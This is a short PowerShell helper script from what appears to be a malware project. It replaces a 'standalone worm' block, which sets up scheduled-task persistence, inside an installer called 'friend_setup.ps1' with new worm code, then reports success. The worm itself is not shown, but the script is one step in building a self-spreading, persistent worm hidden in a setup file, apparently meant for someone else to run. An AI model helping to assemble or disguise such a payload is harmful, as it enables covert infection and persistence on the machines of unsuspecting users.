$main = Get-Content 'C:\Users\Death\alpha-v2\friend_setup.ps1' -Raw
$newBlock = Get-Content 'C:\Users\Death\alpha-v2\new_standalone_worm.ps1' -Raw
$start = $main.IndexOf('# Create standalone worm script file for scheduled task persistence')
$end = $main.IndexOf('[System.IO.File]::WriteAllText($wormScriptPath, $wormScriptContent, (New-Object System.Text.UTF8Encoding $false))') + 73
if ($start -ge 0 -and $end -ge 0) {
    $result = $main.Substring(0, $start) + $newBlock + "`n" + $main.Substring($end)
    [System.IO.File]::WriteAllText('C:\Users\Death\alpha-v2\friend_setup.ps1', $result)
    Write-Host 'Standalone worm replacement done'
} else {
    Write-Host "Markers not found: start=$start end=$end"
}